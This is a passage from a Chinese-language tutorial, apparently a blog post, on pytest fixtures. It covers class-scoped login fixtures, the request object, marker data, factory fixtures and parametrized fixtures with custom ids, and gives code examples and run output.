function_">driver</span>():<br>    _driver = Chrome()<br>    <span class="hljs-keyword">yield</span> _driver<br>    _driver.quit()<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">landing_page</span>(<span class="hljs-params">driver, login</span>):<br>    <span class="hljs-keyword">return</span> LandingPage(driver)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestLandingPageSuccess</span>:<br><span class="hljs-meta">    @pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span>, autouse=<span class="hljs-literal">True</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self, driver, base_url, user</span>):<br>        driver.get(urljoin(base_url, <span class="hljs-string">&quot;/login&quot;</span>))<br>        page = LoginPage(driver)<br>        page.login(user)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_name_in_header</span>(<span class="hljs-params">self, landing_page, user</span>):<br>        <span class="hljs-keyword">assert</span> landing_page.header == <span class="hljs-string">f&quot;Welcome, <span class="hljs-subst">&#123;user.name&#125;</span>!&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_sign_out_button</span>(<span class="hljs-params">self, landing_page</span>):<br>        <span class="hljs-keyword">assert</span> landing_page.sign_out_button.is_displayed()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_profile_link</span>(<span class="hljs-params">self, landing_page, user</span>):<br>        profile_href = urljoin(base_url, <span class="hljs-string">f&quot;/profile?id=<span class="hljs-subst">&#123;user.profile_id&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">assert</span> landing_page.profile_link.get_attribute(<span class="hljs-string">&quot;href&quot;</span>) == profile_href<br></code></pre></td></tr></table></figure><p>请注意，这些方法只是在签名中引用 self 作为一种形式。没有任何状态与实际的测试类相关，因为它可能位于 unittest.TestCase 框架中。一切都由 pytest 夹具系统管理。</p><p>每个方法只需要请求它实际需要的fixture，而不用担心执行顺序。这是因为fixture装置是一个自动使用的fixture，并且它确保所有其他fixture在它之前执行。</p><p>不再需要进行状态更改，因此测试可以自由地进行任意数量的非状态更改查询，而不必冒踩到其他测试的风险。</p><blockquote><p>登录装置也在类内部定义，因为并非模块中的每个其他测试都期望成功登录，并且对于另一个测试类，该行为可能需要稍微不同地处理。可以每个类每个登录</p></blockquote><blockquote><p>这里表达的是，在一个测试类内，运行多个测试用例，多个断言，不会因为某个测试用例的断言失败了导致另一个测试用例无法运行下下去，虽然他们都是使用的同一个fixture夹具，你需要其他的登录前置，那么你可以在另一个类内编写一个fixture 供这个类内的用例去使用，</p></blockquote><p>例如，如果我们想围绕提交错误凭据编写另一个测试场景，我们可以通过在测试文件中添加如下内容来处理它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestLandingPageBadCredentials</span>:<br><span class="hljs-meta">    @pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;class&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">faux_user</span>(<span class="hljs-params">self, user</span>):<br>        _user = deepcopy(user)<br>        _user.password = <span class="hljs-string">&quot;badpass&quot;</span><br>        <span class="hljs-keyword">return</span> _user<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_raises_bad_credentials_exception</span>(<span class="hljs-params">self, login_page, faux_user</span>):<br>        <span class="hljs-keyword">with</span> pytest.raises(BadCredentialsException):<br>            login_page.login(faux_user)<br></code></pre></td></tr></table></figure><h2 id="4-7-Fixtures-可以使用内置的requesting来测试上下文【重点】"><a href="#4-7-Fixtures-可以使用内置的requesting来测试上下文【重点】" class="headerlink" title="4.7 Fixtures 可以使用内置的requesting来测试上下文【重点】"></a>4.7 Fixtures 可以使用内置的requesting来测试上下文【重点】</h2><p><code>fixture</code>函数可以接受<code>requesting</code>对象来内省“request”来测试函数、类或模块上下文。</p><p>进一步扩展前面的 smtp_connection 夹具示例，让我们从使用我们的夹具的测试模块中读取可选的服务器 URL：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><span class="hljs-keyword">import</span> smtplib<br><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smtp_connection</span>(<span class="hljs-params">request</span>):<br>    server = <span class="hljs-built_in">getattr</span>(request.module, <span class="hljs-string">&quot;smtpserver&quot;</span>, <span class="hljs-string">&quot;smtp.gmail.com&quot;</span>) <span class="hljs-comment"># getattr()获取对象的属性和方法，第一个参数是对象本身，第二个参数是对象的属性，第三个参数是如果没有时的返回默认值</span><br>    smtp_connection = smtplib.SMTP(server, <span class="hljs-number">587</span>, timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">yield</span> smtp_connection<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;finalizing <span class="hljs-subst">&#123;smtp_connection&#125;</span> (<span class="hljs-subst">&#123;server&#125;</span>)&quot;</span>)<br>    smtp_connection.close()<br></code></pre></td></tr></table></figure><p>我们使用<code>request.module</code>属性来选择性地从测试模块获取 <code>smtpserver </code>属性。如果我们再次执行，没有什么改变：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -s -q --tb=no test_module.py<br>FFfinalizing &lt;smtplib.SMTP <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0002</span>&gt; (smtp.gmail.com)<br><br>========================= short test summary info ==========================<br>FAILED test_module.py::test_ehlo - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br>FAILED test_module.py::test_noop - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br><span class="hljs-number">2</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>让我们快速创建另一个测试模块，该模块实际上在其模块命名空间中设置服务器 URL：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"> content of test_anothersmtp.py<br><br>smtpserver = <span class="hljs-string">&quot;mail.python.org&quot;</span>  <span class="hljs-comment"># will be read by smtp fixture</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_showhelo</span>(<span class="hljs-params">smtp_connection</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>, smtp_connection.helo()<br></code></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -qq --tb=short test_anothersmtp.py<br>F                                                                    [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>______________________________ test_showhelo _______________________________<br>test_anothersmtp.py:<span class="hljs-number">6</span>: <span class="hljs-keyword">in</span> test_showhelo<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>, smtp_connection.helo()<br>E   AssertionError: (<span class="hljs-number">250</span>, <span class="hljs-string">b&#x27;mail.python.org&#x27;</span>)<br>E   <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br>------------------------- Captured stdout teardown -------------------------<br>finalizing &lt;smtplib.SMTP <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0003</span>&gt; (mail.python.org)<br>========================= short test summary info ==========================<br>FAILED test_anothersmtp.py::test_showhelo - AssertionError: (<span class="hljs-number">250</span>, <span class="hljs-string">b&#x27;mail....</span><br></code></pre></td></tr></table></figure><p>瞧！ smtp_connection fixture从模块命名空间中获取我们的邮件服务器名称。</p><blockquote><p>通过request.module获取测试模块对象，request是一个对象，这个对象就是整场测试，</p><p>request是一个特俗的fixute用于获取有关当前测试的信息和操作</p></blockquote><h2 id="4-8-使用标记将数据传递到fixtures"><a href="#4-8-使用标记将数据传递到fixtures" class="headerlink" title="4.8 使用标记将数据传递到fixtures"></a>4.8 使用标记将数据传递到fixtures</h2><p>使用request对象，夹具还可以访问应用于测试功能的标记。这对于将数据从测试传递到夹具中非常有用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fixt</span>(<span class="hljs-params">request</span>): <span class="hljs-comment"># 这个fixture的目的是获取被测用例的mark的标记，</span><br>    marker = request.node.get_closest_marker(<span class="hljs-string">&quot;fixt_data&quot;</span>) <span class="hljs-comment"># 获取用例的mark标记的fixt_data</span><br>    <span class="hljs-keyword">if</span> marker <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># Handle missing marker in some way...</span><br>        data = <span class="hljs-literal">None</span> <span class="hljs-comment"># 如果没有使用标记，就返回none </span><br>    <span class="hljs-keyword">else</span>:<br>        data = marker.args[<span class="hljs-number">0</span>] <span class="hljs-comment"># 如果有使用mark标记，就返回标记的值</span><br>    <span class="hljs-comment"># Do something with the data</span><br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@pytest.mark.fixt_data(<span class="hljs-params"><span class="hljs-number">42</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_fixt</span>(<span class="hljs-params">fixt</span>):<br>    <span class="hljs-keyword">assert</span> fixt == <span class="hljs-number">42</span> <span class="hljs-comment"># 断言成功</span><br></code></pre></td></tr></table></figure><h2 id="4-9-工厂-fixtures【重点】"><a href="#4-9-工厂-fixtures【重点】" class="headerlink" title="4.9 工厂 fixtures【重点】"></a>4.9 工厂 fixtures【重点】</h2><p>“工厂即夹具”模式可以在单次测试中多次需要夹具结果的情况下提供帮助。</p><p>夹具不是直接返回数据，而是返回生成数据的函数。然后可以在测试中多次调用该函数。</p><blockquote><p>这里需要了解一下什么是工厂函数，或者说工厂设计模式了，工厂可以根据条件或者参数的不同来创建不同类型的对象</p></blockquote><p>演员可以根据需要拥有参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_customer_record</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_make_customer_record</span>(<span class="hljs-params">name</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Making customer record for <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;orders&quot;</span>: []&#125;<br><br>    <span class="hljs-keyword">return</span> _make_customer_record <span class="hljs-comment">#返回的是一个函数</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_customer_records</span>(<span class="hljs-params">make_customer_record</span>):<br>    <span class="hljs-comment"># 调用3次，获得3个不同的对象，因为这个fixture的返回值就是一个函数</span><br>    customer_1 = make_customer_record(<span class="hljs-string">&quot;Lisa&quot;</span>) <span class="hljs-comment"># 调用这个函数，Making customer record for Lisa</span><br>    customer_2 = make_customer_record(<span class="hljs-string">&quot;Mike&quot;</span>) <span class="hljs-comment"># Making customer record for Mike</span><br>    customer_3 = make_customer_record(<span class="hljs-string">&quot;Meredith&quot;</span>) <span class="hljs-comment"># Making customer record for Meredith</span><br></code></pre></td></tr></table></figure><p>如果工厂创建的数据需要管理，夹具可以处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_customer_record</span>():<br>    created_records = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_make_customer_record</span>(<span class="hljs-params">name</span>):<br>        record = models.Customer(name=name, orders=[])<br>        created_records.append(record)<br>        <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">yield</span> _make_customer_record<br><br>    <span class="hljs-keyword">for</span> record <span class="hljs-keyword">in</span> created_records: <span class="hljs-comment"># 这一条在测试用例结束时执行</span><br>        record.destroy() <span class="hljs-comment"># 循环销毁的意思，</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_customer_records</span>(<span class="hljs-params">make_customer_record</span>):<br>    customer_1 = make_customer_record(<span class="hljs-string">&quot;Lisa&quot;</span>)<br>    customer_2 = make_customer_record(<span class="hljs-string">&quot;Mike&quot;</span>)<br>    customer_3 = make_customer_record(<span class="hljs-string">&quot;Meredith&quot;</span>)<br></code></pre></td></tr></table></figure><blockquote><p><code>fixture</code>可以定义成一个工厂方法供测试用例去使用</p></blockquote><h2 id="4-10-参数化-fixtures【重点】"><a href="#4-10-参数化-fixtures【重点】" class="headerlink" title="4.10 参数化 fixtures【重点】"></a>4.10 参数化 fixtures【重点】</h2><p>夹具函数可以参数化，在这种情况下，它们将被多次调用，每次执行一组相关测试，即依赖于该夹具的测试。</p><p>测试函数通常不需要知道它们的重新运行。夹具参数化有助于为组件编写详尽的功能测试，这些组件本身可以通过多种方式进行配置。</p><p>展前面的示例，我们可以标记该固定装置以创建两个 smtp_connection 固定装置实例，这将导致使用该固定装置的所有测试运行两次。</p><p>Fixture函数通过特殊的请求对象来访问每个参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><span class="hljs-keyword">import</span> smtplib<br><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span>, params=[<span class="hljs-string">&quot;smtp.gmail.com&quot;</span>, <span class="hljs-string">&quot;mail.python.org&quot;</span>]</span>) </span><span class="hljs-comment"># 注意这里定义的params = [ ] 参数是一个列表，所以会运行两次，如何拿到这个参数呢？</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smtp_connection</span>(<span class="hljs-params">request</span>):<br>    smtp_connection = smtplib.SMTP(request.param, <span class="hljs-number">587</span>, timeout=<span class="hljs-number">5</span>) <span class="hljs-comment"># 用request.param去拿即可</span><br>    <span class="hljs-keyword">yield</span> smtp_connection<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;finalizing <span class="hljs-subst">&#123;smtp_connection&#125;</span>&quot;</span>)<br>    smtp_connection.close()<br></code></pre></td></tr></table></figure><p>主要需要了解的是使用 @pytest.fixture 声明参数，这是一个值列表，其中的每个值将被执行，并且可以通过 request.param 访问值。</p><p><strong>写一个简单的更容易理解：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;session&quot;</span>, params=[ [<span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>],[<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;one&#x27;</span>]]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_param</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> request.param<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_getParam</span>(<span class="hljs-params">get_param</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;第<span class="hljs-subst">&#123;get_param[<span class="hljs-number">0</span>]&#125;</span>次运行，打印<span class="hljs-subst">&#123;get_param[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 运行结果：</span><br>============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span><br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collected <span class="hljs-number">2</span> items<br><br>testcases/test_fixturestest.py <br>第<span class="hljs-number">1</span>次运行，打印one<br>.第<span class="hljs-number">2</span>次运行，打印two<br>.<br><br>============================== <span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ======================<br></code></pre></td></tr></table></figure><p>这里可以看到，这个测试函数，针对get_param方法，运行了两次，</p><p>pytest 可以使用字符串进行标记，这个字符串是参数化fixture夹具中每个夹具值的测试 ID 标签，。这些 ID 可以与 -k 一起使用来选择运行的指定的测试用例，并且它们也支持失败重试，</p><p>也可以在命令行执行测试时加入 <code>--collect-only </code>命令可以在运行测试时展示对应的 ID</p><p>数字、字符串、布尔值和 None 将在测试 ID 中使用其常用的字符串表示形式。</p><p>对于其他对象，pytest 将根据参数名称创建一个字符串。通过使用 ids 关键字参数，可以为某个固定装置值自定义测试 ID 中使用的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_ids.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">params=[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], ids=[<span class="hljs-string">&quot;spam&quot;</span>, <span class="hljs-string">&quot;ham&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-built_in">print</span>(request.param)<br>    <span class="hljs-keyword">return</span> request.param<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_a</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">pass</span><br><br>========================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... collected <span class="hljs-number">2</span> items<br><br>testcases/test_fixturestest.py::test_a[ham] <span class="hljs-number">1</span> <span class="hljs-comment"># ham 是 id 1 是参数</span><br>PASSED<br>testcases/test_fixturestest.py::test_a[spam] <span class="hljs-number">0</span> <span class="hljs-comment"># spam 是 id 1 是参数</span><br>PASSED<br><br>============================== <span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ========<br><span class="hljs-comment"># 也可以支持动态给标签</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">idfn</span>(<span class="hljs-params">fixture_value</span>): <span class="hljs-comment"># 动态给标签</span><br>    <span class="hljs-keyword">if</span> fixture_value == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eggs&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;eggs&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;执行了 &quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">params=[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], ids=idfn</span>) </span><span class="hljs-comment"># 支持动态传入标签</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-built_in">print</span>(request.param)<br>    <span class="hljs-keyword">return</span> request.param<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_b</span>(<span class="hljs-params">b</span>):<br>    <span class="hljs-keyword">pass</span><br>====================== test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code//venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... eggs<br>执行了 <br>collected <span class="hljs-number">2</span> items<br><br>testcases/test_fixturestest.py::test_b[<span class="hljs-number">1</span>] <span class="hljs-number">1</span> <span class="hljs-comment"># id 和 参数化</span><br>PASSED<br>testcases/test_fixturestest.py::test_b[eggs] <span class="hljs-number">0</span><br>PASSED<br><br>============================== <span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ===============<br></code></pre></td></tr></table></figure><p>也可以在<code>pytest.ini</code>里面使用<code>-k</code>接字符串来指定标签运行</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># content of pytest.ini</span><br><span class="hljs-section">[pytest]</span><br><span class="hljs-attr">addopts</span> = -s -v  -k <span class="hljs-string">&quot;ham&quot;</span><br><span class="hljs-comment"># -s 是捕获打印输出，如果有用到print()打印终端输出的话，就必须就加这个</span><br><span class="hljs-comment"># -v 就是展示标识符，</span><br><span class="hljs-comment"># -k 就是制定表示符</span><br></code></pre></td></tr></table></figure><h2 id="4-11-使用带标记参数化fixture夹具"><a href="#4-11-使用带标记参数化fixture夹具" class="headerlink" title="4.11 使用带标记参数化fixture夹具"></a>4.11 使用带标记参数化fixture夹具</h2><p><code>pytest.param()</code> 可用于在参数化装置的值集中应用标记，其方式与与 @pytest.mark.parametrize 使用的方式相同。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_fixture_marks.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">params=[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, pytest.param(<span class="hljs-params"><span class="hljs-number">2</span>, marks=pytest.mark.skip</span>)]</span>) </span><span class="hljs-comment"># 使用 pytest.param</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_set</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> request.param<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_data</span>(<span class="hljs-params">data_set</span>):<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>运行此测试将跳过对值为 2 的 data_set 的调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest test_fixture_marks.py -v<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">8.</span>x.y, pluggy-<span class="hljs-number">1.</span>x.y -- $PYTHON_PREFIX/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/sweet/project<br>collecting ... collected <span class="hljs-number">3</span> items<br><br>test_fixture_marks.py::test_data[<span class="hljs-number">0</span>] PASSED                           [ <span class="hljs-number">33</span>%]<br>test_fixture_marks.py::test_data[<span class="hljs-number">1</span>] PASSED                           [ <span class="hljs-number">66</span>%]<br>test_fixture_marks.py::test_data[<span class="hljs-number">2</span>] SKIPPED (unconditional skip)     [<span class="hljs-number">100</span>%]<br><br>======================= <span class="hljs-number">2</span> passed, <span class="hljs-number">1</span> skipped <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =======================<br></code></pre></td></tr></table></figure><h2 id="4-12-模块化：从一个fixutre方法中使用fixture"><a href="#4-12-模块化：从一个fixutre方法中使用fixture" class="headerlink" title="4.12 模块化：从一个fixutre方法中使用fixture"></a>4.12 模块化：从一个fixutre方法中使用fixture</h2><p>模块化：使用固定功能中的固定装置</p><p>除了在测试函数中使用固定装置之外，固定装置函数还可以使用其他固定装置本身</p><p>这有助于设备的模块化设计，并允许在许多项目中重复使用特定于框架的设备。举个简单的例子，</p><p>我们可以扩展前面的示例并实例化一个对象应用程序，将已定义的 smtp_connection 资源粘贴到其中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of 